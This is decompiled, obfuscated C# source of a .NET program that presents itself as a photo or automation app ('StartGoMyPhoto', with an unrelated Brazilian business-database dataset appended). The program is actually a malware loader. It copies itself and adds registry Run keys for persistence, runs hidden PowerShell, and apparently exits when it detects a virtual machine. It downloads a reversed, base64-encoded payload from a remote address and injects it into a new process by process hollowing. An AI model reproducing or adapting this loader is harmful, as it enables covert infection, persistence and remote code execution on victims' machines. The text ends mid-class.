using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Configuration;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Schema;
using System.Xml.Serialization;
using \u0002;
using \u0003;
using \u0004;
using \u0005;
using \u0006;
using \u0008;
using \u000e;
using \u0010;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SmartAssembly.Attributes;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

[assembly: Guid("e298ec96-29bc-469d-8027-4b8f685b3956")]
[assembly: ComVisible(false)]
[assembly: AssemblyTrademark("")]
[assembly: TargetFramework(".NETFramework,Version=v4.8", FrameworkDisplayName = ".NET Framework 4.8")]
[assembly: NeutralResourcesLanguage("en-CY")]
[assembly: AssemblyFileVersion("4.0.0.0")]
[assembly: AssemblyCopyright("Copyright ©  2024")]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
[assembly: AssemblyTitle("asdasd")]
[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: AssemblyProduct("d")]
[assembly: AssemblyCompany("asd")]
[assembly: AssemblyDescription("asd")]
[assembly: AssemblyConfiguration("")]
[assembly: SuppressIldasm]
[assembly: PoweredBy("Powered by SmartAssembly 6.9.0.114")]
[assembly: AssemblyVersion("4.0.4.0")]
namespace \u0003
{
	[CompilerGenerated]
	[\u0001]
	internal sealed class \u0001 : Attribute
	{
		public \u0001()
		{
			\u0008.\u0002.\u0001();
			base..ctor();
		}
	}
}
namespace \u0010
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Parameter | AttributeTargets.ReturnValue | AttributeTargets.GenericParameter, AllowMultiple = false, Inherited = false)]
	[\u0003.\u0001]
	[CompilerGenerated]
	internal sealed class \u0001 : Attribute
	{
		public readonly byte[] \u0001;

		public \u0001(byte P_0)
		{
			\u0008.\u0002.\u0001();
			base..ctor();
			\u0001 = new byte[1] { P_0 };
		}

		public \u0001(byte[] P_0)
		{
			\u0008.\u0002.\u0001();
			base..ctor();
			\u0001 = P_0;
		}
	}
}
namespace \u0005
{
	[CompilerGenerated]
	[\u0003.\u0001]
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Method | AttributeTargets.Interface | AttributeTargets.Delegate, AllowMultiple = false, Inherited = false)]
	internal sealed class \u0001 : Attribute
	{
		public readonly byte \u0001;

		public \u0001(byte P_0)
		{
			\u0008.\u0002.\u0001();
			base..ctor();
			\u0001 = P_0;
		}
	}
}
namespace StartGoMyPhoto
{
	[global::\u0005.\u0001(1)]
	[\u0010.\u0001(0)]
	public class Form1 : Form
	{
		public static Random \u0001;

		[\u0010.\u0001(0)]
		private IContainer m_\u0002;

		[\u0010.\u0001(0)]
		private Button \u0003;

		[\u0010.\u0001(0)]
		private Button \u0004;

		[\u0010.\u0001(0)]
		private TextBox \u0005;

		[NonSerialized]
		internal static GetString \u0002;

		public Form1()
		{
			\u0008.\u0002.\u0001();
			this.m_\u0002 = null;
			((Form)this)..ctor();
			\u0001();
		}

		private void \u0001(object \u0002, EventArgs \u0003)
		{
		}

		private string \u0001(int \u0002)
		{
			return new string((from text in Enumerable.Repeat(global::\u0004.\u0001.\u0001(0), \u0002)
				select text[Form1.\u0001.Next(text.Length)]).ToArray());
		}

		private string \u0001(Random \u0002, int \u0003)
		{
			string text = global::\u0004.\u0001.\u0001(40);
			text += text.ToUpper();
			string text2 = Form1.\u0002(157);
			for (int i = 0; i < \u0003; i++)
			{
				text2 += text[\u0002.Next(0, text.Length)];
			}
			return text2;
		}

		public static string \u0001(string \u0002)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(\u0002);
			return Convert.ToBase64String(bytes);
		}

		private void \u0002(object \u0002, EventArgs \u0003)
		{
		}

		protected override void \u0001(bool \u0002)
		{
			if (\u0002 && this.m_\u0002 != null)
			{
				this.m_\u0002.Dispose();
			}
			((Form)this).Dispose(\u0002);
		}

		private void \u0001()
		{
			//IL_0002: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Expected O, but got Unknown
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Expected O, but got Unknown
			\u0003 = new Button();
			\u0004 = new Button();
			\u0005 = new TextBox();
			((Control)this).SuspendLayout();
			((Control)\u0003).Location = new Point(60, 86);
			((Control)\u0003).Name = global::\u0004.\u0001.\u0001(76);
			((Control)\u0003).Size = new Size(75, 23);
			((Control)\u0003).TabIndex = 0;
			((Control)\u0003).Text = global::\u0004.\u0001.\u0001(76);
			((ButtonBase)\u0003).UseVisualStyleBackColor = true;
			((Control)\u0003).Click += \u0001;
			((Control)\u0004).Location = new Point(253, 86);
			((Control)\u0004).Name = global::\u0004.\u0001.\u0001(94);
			((Control)\u0004).Size = new Size(75, 23);
			((Control)\u0004).TabIndex = 1;
			((Control)\u0004).Text = global::\u0004.\u0001.\u0001(94);
			((ButtonBase)\u0004).UseVisualStyleBackColor = true;
			((Control)\u0004).Click += \u0002;
			((Control)\u0005).Location = new Point(146, 140);
			((Control)\u0005).Name = global::\u0004.\u0001.\u0001(112);
			((Control)\u0005).Size = new Size(140, 22);
			((Control)\u0005).TabIndex = 2;
			((ContainerControl)this).AutoScaleDimensions = new SizeF(8f, 16f);
			((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
			((Form)this).ClientSize = new Size(457, 292);
			((Control)this).Controls.Add((Control)(object)\u0005);
			((Control)this).Controls.Add((Control)(object)\u0004);
			((Control)this).Controls.Add((Control)(object)\u0003);
			((Control)this).Name = global::\u0004.\u0001.\u0001(132);
			((Control)this).Text = global::\u0004.\u0001.\u0001(146);
			((Control)this).ResumeLayout(false);
			((Control)this).PerformLayout();
		}

		static Form1()
		{
			Strings.CreateGetStringDelegate(typeof(Form1));
			\u0008.\u0002.\u0001();
			Form1.\u0001 = new Random();
		}
	}
}
namespace \u0008
{
	[DebuggerNonUserCode]
	internal static class \u0001
	{
		[DebuggerNonUserCode]
		[StandardModule]
		internal sealed class \u0001
		{
			private delegate int \u0001(IntPtr handle);

			private delegate bool \u0002(IntPtr thread, int[] context);

			private delegate bool \u0003(IntPtr thread, int[] context);

			private delegate bool \u0004(IntPtr thread, int[] context);

			private delegate bool \u0005(IntPtr thread, int[] context);

			private delegate int \u0006(IntPtr handle, int address, int length, int type, int protect);

			private delegate bool \u0007(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

			private delegate bool \u0008(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

			private delegate int \u000e(IntPtr process, int baseAddress);

			private delegate bool \u000f(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref \u0011 startupInfo, ref \u0010 processInformation);

			[StructLayout(LayoutKind.Sequential, Pack = 1)]
			[DebuggerNonUserCode]
			private struct \u0010
			{
				public readonly IntPtr \u0001;

				public readonly IntPtr \u0002;

				public readonly uint \u0003;

				private readonly uint \u0004;
			}

			[StructLayout(LayoutKind.Sequential, Pack = 1)]
			[DebuggerNonUserCode]
			private struct \u0011
			{
				public uint \u0001;

				private readonly string \u0002;

				private readonly string \u0003;

				private readonly string \u0004;

				[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
				private readonly byte[] \u0005;

				private readonly IntPtr \u0006;

				private readonly IntPtr \u0007;

				private readonly IntPtr \u0008;

				private readonly IntPtr \u000e;
			}

			private static readonly \u0001 m_\u0001;

			private static readonly \u0002 m_\u0002;

			private static readonly \u0003 m_\u0003;

			private static readonly \u0004 m_\u0004;

			private static readonly \u0005 m_\u0005;

			private static readonly \u0006 m_\u0006;

			private static readonly \u0007 m_\u0007;

			private static readonly \u0008 m_\u0008;

			private static readonly \u000e m_\u000e;

			private static readonly \u000f m_\u000f;

			[DllImport("kernel32", EntryPoint = "LoadLibraryA", SetLastError = true)]
			[DebuggerNonUserCode]
			private static extern IntPtr \u0001([MarshalAs(UnmanagedType.VBByRefStr)] ref string \u0002);

			[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", SetLastError = true)]
			[DebuggerNonUserCode]
			private static extern IntPtr \u0001(IntPtr \u0002, [MarshalAs(UnmanagedType.VBByRefStr)] ref string \u0003);

			[DebuggerNonUserCode]
			private static \u0001 \u0001<\u0001>(string \u0002, string \u0003)
			{
				return Conversions.ToGenericParameter<\u0001>((object)Marshal.GetDelegateForFunctionPointer(global::\u0008.\u0001.\u0001.\u0001(global::\u0008.\u0001.\u0001.\u0001(ref \u0002), ref \u0003), typeof(\u0001)));
			}

			[DebuggerNonUserCode]
			public static void \u0001(byte[] \u0002, string \u0003, string \u0004)
			{
				checked
				{
					if (Operators.CompareString(\u0004, global::\u0004.\u0001.\u0001(322), false) == 0)
					{
						string applicationName = global::\u0004.\u0001.\u0001(1712);
						int num = 0;
						do
						{
							int bytesRead = 0;
							\u0011 startupInfo = default(\u0011);
							\u0010 processInformation = default(\u0010);
							startupInfo.\u0001 = Convert.ToUInt32(Marshal.SizeOf(typeof(\u0011)));
							try
							{
								if (!global::\u0008.\u0001.\u0001.m_\u000f(applicationName, string.Empty, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 134217732u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
								{
									throw new Exception();
								}
								int num2 = BitConverter.ToInt32(\u0002, 60);
								int num3 = BitConverter.ToInt32(\u0002, num2 + 52);
								int[] array = new int[179];
								array[0] = 65538;
								if (IntPtr.Size == 4)
								{
									if (!global::\u0008.\u0001.\u0001.m_\u0005(processInformation.\u0002, array))
									{
										throw new Exception();
									}
								}
								else if (!global::\u0008.\u0001.\u0001.m_\u0004(processInformation.\u0002, array))
								{
									throw new Exception();
								}
								int num4 = array[41];
								int buffer = 0;
								if (!global::\u0008.\u0001.\u0001.m_\u0008(processInformation.\u0001, num4 + 8, ref buffer, 4, ref bytesRead))
								{
									throw new Exception();
								}
								if (num3 == buffer && global::\u0008.\u0001.\u0001.m_\u000e(processInformation.\u0001, buffer) != 0)
								{
									throw new Exception();
								}
								int length = BitConverter.ToInt32(\u0002, num2 + 80);
								int bufferSize = BitConverter.ToInt32(\u0002, num2 + 84);
								bool flag = false;
								int num5 = global::\u0008.\u0001.\u0001.m_\u0006(processInformation.\u0001, num3, length, 12288, 64);
								if (num5 == 0)
								{
									throw new Exception();
								}
								if (!global::\u0008.\u0001.\u0001.m_\u0007(processInformation.\u0001, num5, \u0002, bufferSize, ref bytesRead))
								{
									throw new Exception();
								}
								int num6 = num2 + 248;
								int num7 = BitConverter.ToInt16(\u0002, num2 + 6) - 1;
								for (int i = 0; i <= num7; i++)
								{
									int num8 = BitConverter.ToInt32(\u0002, num6 + 12);
									int num9 = BitConverter.ToInt32(\u0002, num6 + 16);
									int srcOffset = BitConverter.ToInt32(\u0002, num6 + 20);
									if (num9 != 0)
									{
										byte[] array2 = new byte[num9 - 1 + 1];
										Buffer.BlockCopy(\u0002, srcOffset, array2, 0, array2.Length);
										if (!global::\u0008.\u0001.\u0001.m_\u0007(processInformation.\u0001, num5 + num8, array2, array2.Length, ref bytesRead))
										{
											throw new Exception();
										}
									}
									num6 += 40;
								}
								byte[] bytes = BitConverter.GetBytes(num5);
								if (!global::\u0008.\u0001.\u0001.m_\u0007(processInformation.\u0001, num4 + 8, bytes, 4, ref bytesRead))
								{
									throw new Exception();
								}
								int num10 = BitConverter.ToInt32(\u0002, num2 + 40);
								if (flag)
								{
									num5 = num3;
								}
								array[44] = num5 + num10;
								if (IntPtr.Size == 4)
								{
									if (!global::\u0008.\u0001.\u0001.m_\u0003(processInformation.\u0002, array))
									{
										throw new Exception();
									}
								}
								else if (!global::\u0008.\u0001.\u0001.m_\u0002(processInformation.\u0002, array))
								{
									throw new Exception();
								}
								if (global::\u0008.\u0001.\u0001.m_\u0001(processInformation.\u0002) != -1)
								{
									break;
								}
								throw new Exception();
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								Process.GetProcessById(Convert.ToInt32(processInformation.\u0003)).Kill();
								ProjectData.ClearProjectError();
							}
							num++;
						}
						while (num <= 4);
						return;
					}
					string applicationName2 = global::\u0004.\u0001.\u0001(1770) + \u0003 + global::\u0004.\u0001.\u0001(1866);
					int num11 = 0;
					do
					{
						int bytesRead2 = 0;
						\u0011 startupInfo2 = default(\u0011);
						\u0010 processInformation2 = default(\u0010);
						startupInfo2.\u0001 = Convert.ToUInt32(Marshal.SizeOf(typeof(\u0011)));
						try
						{
							if (!global::\u0008.\u0001.\u0001.m_\u000f(applicationName2, string.Empty, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 134217732u, IntPtr.Zero, null, ref startupInfo2, ref processInformation2))
							{
								throw new Exception();
							}
							int num12 = BitConverter.ToInt32(\u0002, 60);
							int num13 = BitConverter.ToInt32(\u0002, num12 + 52);
							int[] array3 = new int[179];
							array3[0] = 65538;
							if (IntPtr.Size == 4)
							{
								if (!global::\u0008.\u0001.\u0001.m_\u0005(processInformation2.\u0002, array3))
								{
									throw new Exception();
								}
							}
							else if (!global::\u0008.\u0001.\u0001.m_\u0004(processInformation2.\u0002, array3))
							{
								throw new Exception();
							}
							int num14 = array3[41];
							int buffer2 = 0;
							if (!global::\u0008.\u0001.\u0001.m_\u0008(processInformation2.\u0001, num14 + 8, ref buffer2, 4, ref bytesRead2))
							{
								throw new Exception();
							}
							if (num13 == buffer2 && global::\u0008.\u0001.\u0001.m_\u000e(processInformation2.\u0001, buffer2) != 0)
							{
								throw new Exception();
							}
							int length2 = BitConverter.ToInt32(\u0002, num12 + 80);
							int bufferSize2 = BitConverter.ToInt32(\u0002, num12 + 84);
							bool flag2 = false;
							int num15 = global::\u0008.\u0001.\u0001.m_\u0006(processInformation2.\u0001, num13, length2, 12288, 64);
							if (num15 == 0)
							{
								throw new Exception();
							}
							if (!global::\u0008.\u0001.\u0001.m_\u0007(processInformation2.\u0001, num15, \u0002, bufferSize2, ref bytesRead2))
							{
								throw new Exception();
							}
							int num16 = num12 + 248;
							int num17 = BitConverter.ToInt16(\u0002, num12 + 6) - 1;
							for (int j = 0; j <= num17; j++)
							{
								int num18 = BitConverter.ToInt32(\u0002, num16 + 12);
								int num19 = BitConverter.ToInt32(\u0002, num16 + 16);
								int srcOffset2 = BitConverter.ToInt32(\u0002, num16 + 20);
								if (num19 != 0)
								{
									byte[] array4 = new byte[num19 - 1 + 1];
									Buffer.BlockCopy(\u0002, srcOffset2, array4, 0, array4.Length);
									if (!global::\u0008.\u0001.\u0001.m_\u0007(processInformation2.\u0001, num15 + num18, array4, array4.Length, ref bytesRead2))
									{
										throw new Exception();
									}
								}
								num16 += 40;
							}
							byte[] bytes2 = BitConverter.GetBytes(num15);
							if (!global::\u0008.\u0001.\u0001.m_\u0007(processInformation2.\u0001, num14 + 8, bytes2, 4, ref bytesRead2))
							{
								throw new Exception();
							}
							int num20 = BitConverter.ToInt32(\u0002, num12 + 40);
							if (flag2)
							{
								num15 = num13;
							}
							array3[44] = num15 + num20;
							if (IntPtr.Size == 4)
							{
								if (!global::\u0008.\u0001.\u0001.m_\u0003(processInformation2.\u0002, array3))
								{
									throw new Exception();
								}
							}
							else if (!global::\u0008.\u0001.\u0001.m_\u0002(processInformation2.\u0002, array3))
							{
								throw new Exception();
							}
							if (global::\u0008.\u0001.\u0001.m_\u0001(processInformation2.\u0002) == -1)
							{
								throw new Exception();
							}
							break;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							Process.GetProcessById(Convert.ToInt32(processInformation2.\u0003)).Kill();
							ProjectData.ClearProjectError();
						}
						num11++;
					}
					while (num11 <= 4);
				}
			}

			public \u0001()
			{
				global::\u0008.\u0002.\u0001();
				base..ctor();
			}

			static \u0001()
			{
				global::\u0008.\u0002.\u0001();
				global::\u0008.\u0001.\u0001.m_\u0001 = \u0001<\u0001>(global::\u0004.\u0001.\u0001(1878), global::\u0004.\u0001.\u0001(1898));
				global::\u0008.\u0001.\u0001.m_\u0002 = \u0001<\u0002>(global::\u0004.\u0001.\u0001(1878), global::\u0004.\u0001.\u0001(1926));
				global::\u0008.\u0001.\u0001.m_\u0003 = \u0001<\u0003>(global::\u0004.\u0001.\u0001(1878), global::\u0004.\u0001.\u0001(1972));
				global::\u0008.\u0001.\u0001.m_\u0004 = \u0001<\u0004>(global::\u0004.\u0001.\u0001(1878), global::\u0004.\u0001.\u0001(2008));
				global::\u0008.\u0001.\u0001.m_\u0005 = \u0001<\u0005>(global::\u0004.\u0001.\u0001(1878), global::\u0004.\u0001.\u0001(2054));
				global::\u0008.\u0001.\u0001.m_\u0006 = \u0001<\u0006>(global::\u0004.\u0001.\u0001(1878), global::\u0004.\u0001.\u0001(2090));
				global::\u0008.\u0001.\u0001.m_\u0007 = \u0001<\u0007>(global::\u0004.\u0001.\u0001(1878), global::\u0004.\u0001.\u0001(2122));
				global::\u0008.\u0001.\u0001.m_\u0008 = \u0001<\u0008>(global::\u0004.\u0001.\u0001(1878), global::\u0004.\u0001.\u0001(2162));
				global::\u0008.\u0001.\u0001.m_\u000e = \u0001<\u000e>(global::\u0004.\u0001.\u0001(2200), global::\u0004.\u0001.\u0001(2214));
				global::\u0008.\u0001.\u0001.m_\u000f = \u0001<\u000f>(global::\u0004.\u0001.\u0001(1878), global::\u0004.\u0001.\u0001(2258));
			}
		}

		private static void \u0001(string \u0002)
		{
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = \u0004.\u0001.\u0001(156);
				processStartInfo.Arguments = \u0002;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process process = new Process();
				process.StartInfo = processStartInfo;
				process.Start();
			}
			catch
			{
			}
		}

		[STAThread]
		[DebuggerNonUserCode]
		private static void \u0001()
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected O, but got Unknown
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_0036: Expected O, but got Unknown
			ManagementObjectSearcher val = new ManagementObjectSearcher(\u0004.\u0001.\u0001(188), \u0004.\u0001.\u0001(212));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.Current;
					if (((ManagementBaseObject)val2)[\u0004.\u0001.\u0001(274)].ToString().Contains(\u0004.\u0001.\u0001(286)))
					{
						Environment.Exit(1);
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}

		[DebuggerNonUserCode]
		public static string \u0001(string \u0002, string \u0003 = "")
		{
			byte[] bytes = Encoding.UTF8.GetBytes(\u0002);
			return Convert.ToBase64String(bytes);
		}
	}
}
namespace StartGoMyPhoto
{
	[DebuggerNonUserCode]
	public class Home
	{
		[DebuggerNonUserCode]
		public static void la(string adress, string enablestartup, string startupname, string injection, string persistence = "0")
		{
			//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
			//IL_01c3: Expected O, but got Unknown
			//IL_01da: Unknown result type (might be due to invalid IL or missing references)
			//IL_01e1: Expected O, but got Unknown
			string text = Path.GetTempPath();
			if (enablestartup == \u0004.\u0001.\u0001(322) && !File.Exists(Path.Combine(text, startupname + \u0004.\u0001.\u0001(328))))
			{
				string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), \u0004.\u0001.\u0001(340), SearchOption.AllDirectories);
				foreach (string sourceFileName in files)
				{
					File.Copy(sourceFileName, Path.Combine(text, startupname + \u0004.\u0001.\u0001(328)), overwrite: true);
				}
				using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0004.\u0001.\u0001(354), writable: true);
				registryKey.SetValue(\u0004.\u0001.\u0001(448), Path.Combine(\u0004.\u0001.\u0001(472) + text, startupname + \u0004.\u0001.\u0001(544)));
			}
			if (enablestartup == \u0004.\u0001.\u0001(558))
			{
				text = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(\u0004.\u0001.\u0001(564), writable: true);
				registryKey2.SetValue(\u0004.\u0001.\u0001(666), Path.Combine(text, startupname) + \u0004.\u0001.\u0001(328));
				if (!File.Exists(Path.Combine(text, startupname + \u0004.\u0001.\u0001(328))))
				{
					RunPS(\u0004.\u0001.\u0001(680) + Path.Combine(text, startupname) + \u0004.\u0001.\u0001(798));
				}
			}
			ManagementObjectSearcher val = new ManagementObjectSearcher(\u0004.\u0001.\u0001(188), \u0004.\u0001.\u0001(212));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.Current;
					if (!((ManagementBaseObject)val2)[\u0004.\u0001.\u0001(274)].ToString().Contains(\u0004.\u0001.\u0001(286)))
					{
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			WebClient webClient = new WebClient();
			webClient.Encoding = Encoding.UTF8;
			adress = string.Concat(adress.Reverse());
			string text2 = string.Concat(webClient.DownloadString(adress).Reverse());
			\u0008.\u0001.\u0001.\u0001(Convert.FromBase64String(text2.Replace(\u0004.\u0001.\u0001(814), \u0004.\u0001.\u0001(828))), injection, \u0004.\u0001.\u0001(834));
			if (persistence == \u0004.\u0001.\u0001(322) && enablestartup != \u0004.\u0001.\u0001(834))
			{
				using (StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + \u0004.\u0001.\u0001(840)))
				{
					streamWriter.WriteLine(\u0004.\u0001.\u0001(862));
					streamWriter.WriteLine(\u0004.\u0001.\u0001(888));
					streamWriter.WriteLine(\u0004.\u0001.\u0001(902));
					streamWriter.WriteLine(\u0004.\u0001.\u0001(950));
					streamWriter.WriteLine(\u0004.\u0001.\u0001(976) + injection + \u0004.\u0001.\u0001(1034) + injection + \u0004.\u0001.\u0001(1100));
					streamWriter.WriteLine(\u0004.\u0001.\u0001(1122) + Path.Combine(text, startupname) + \u0004.\u0001.\u0001(1190));
					streamWriter.WriteLine(\u0004.\u0001.\u0001(1204));
				}
				Process process = new Process();
				process.StartInfo.FileName = Path.GetTempPath() + \u0004.\u0001.\u0001(840);
				process.StartInfo.ErrorDialog = true;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
		}

		[DebuggerNonUserCode]
		private static void RunPS(string args)
		{
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = \u0004.\u0001.\u0001(156);
				processStartInfo.Arguments = args;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process process = new Process();
				process.StartInfo = processStartInfo;
				process.Start();
			}
			catch
			{
			}
		}

		public Home()
		{
			\u0008.\u0002.\u0001();
			base..ctor();
		}
	}
}
namespace \u0006
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
	[DebuggerNonUserCode]
	[CompilerGenerated]
	internal class \u0001
	{
		private static ResourceManager m_\u0001;

		private static CultureInfo \u0002;

		[NonSerialized]
		internal static GetString \u0095;

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static ResourceManager ResourceManager
		{
			get
			{
				if (m_\u0001 == null)
				{
					ResourceManager resourceManager = new ResourceManager(\u0095(186), typeof(\u0001).Assembly);
					m_\u0001 = resourceManager;
				}
				return m_\u0001;
			}
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static CultureInfo Culture
		{
			get
			{
				return \u0002;
			}
			set
			{
				\u0002 = value;
			}
		}

		internal \u0001()
		{
			\u0008.\u0002.\u0001();
			base..ctor();
		}

		static \u0001()
		{
			Strings.CreateGetStringDelegate(typeof(\u0001));
		}
	}
}
namespace StartGoMyPhoto.Properties
{
	[CompilerGenerated]
	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "17.4.0.0")]
	internal sealed class Settings : ApplicationSettingsBase
	{
		private static Settings \u0001;

		public static Settings Default => \u0001;

		public Settings()
		{
			\u0008.\u0002.\u0001();
			((ApplicationSettingsBase)this)..ctor();
		}

		static Settings()
		{
			\u0008.\u0002.\u0001();
			\u0001 = (Settings)(object)SettingsBase.Synchronized((SettingsBase)(object)new Settings());
		}
	}
}
namespace PROJETOAUTOMACAO.VB
{
	[Serializable]
	[DesignerCategory("code")]
	[XmlRoot("BD_AUTOMCAODataSet")]
	[HelpKeyword("vs.data.DataSet")]
	[XmlSchemaProvider("GetTypedDataSetSchema")]
	[ToolboxItem(true)]
	public class BD_AUTOMCAODataSet : DataSet
	{
		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public delegate void TB_CADCLIRowChangeEventHandler(object sender, TB_CADCLIRowChangeEvent e);

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public delegate void TB_CADPRODRowChangeEventHandler(object sender, TB_CADPRODRowChangeEvent e);

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public delegate void TB_CONTASPAGARRowChangeEventHandler(object sender, TB_CONTASPAGARRowChangeEvent e);

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public delegate void TB_CONTASRECEBERRowChangeEventHandler(object sender, TB_CONTASRECEBERRowChangeEvent e);

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public delegate void TB_FORNECEDORESRowChangeEventHandler(object sender, TB_FORNECEDORESRowChangeEvent e);

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public delegate void TB_FUNCIONARIOSRowChangeEventHandler(object sender, TB_FUNCIONARIOSRowChangeEvent e);

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public delegate void TB_LOGINRowChangeEventHandler(object sender, TB_LOGINRowChangeEvent e);

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public delegate void TB_ORDEMSERVICORowChangeEventHandler(object sender, TB_ORDEMSERVICORowChangeEvent e);

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public delegate void TB_PEDIDORowChangeEventHandler(object sender, TB_PEDIDORowChangeEvent e);

		[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
		public delegate void TB_TIPOLANCAMENTORowChangeEventHandler(object sender, TB_TIPOLANCAMENTORowChangeEvent e);

		[Serializable]
		[XmlSchemaProvider("GetTypedTableSchema")]
		public class TB_CADCLIDataTable : DataTable, IEnumerable
		{
			private DataColumn columnCódigo;

			private DataColumn columnNOME_CLI;

			private DataColumn columnAPELIDO;

			private DataColumn columnENDERECO;

			private DataColumn columnCIDADE;

			private DataColumn columnUF;

			private DataColumn columnCEP;

			private DataColumn columnTEL_CEL;

			private DataColumn columnTEL_RES;

			private DataColumn columnCOMPLEMENTO;

			private DataColumn columnDAT_NASC;

			private DataColumn columnDAT_CAD;

			private DataColumn columnEMAIL;

			private DataColumn columnFACEBOOK;

			private DataColumn columnCONTATO;

			private DataColumn columnCNPJ;

			private DataColumn columnINS;

			private DataColumn columnCPF;

			private DataColumn columnRG;

			private DataColumn columnOBSERVACAO;

			private DataColumn columnBAIRRO;

			private DataColumn columnFILIACAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CódigoColumn => columnCódigo;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn NOME_CLIColumn => columnNOME_CLI;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn APELIDOColumn => columnAPELIDO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn ENDERECOColumn => columnENDERECO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CIDADEColumn => columnCIDADE;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn UFColumn => columnUF;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn CEPColumn => columnCEP;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn TEL_CELColumn => columnTEL_CEL;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn TEL_RESColumn => columnTEL_RES;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn COMPLEMENTOColumn => columnCOMPLEMENTO;

			[DebuggerNonUserCode]
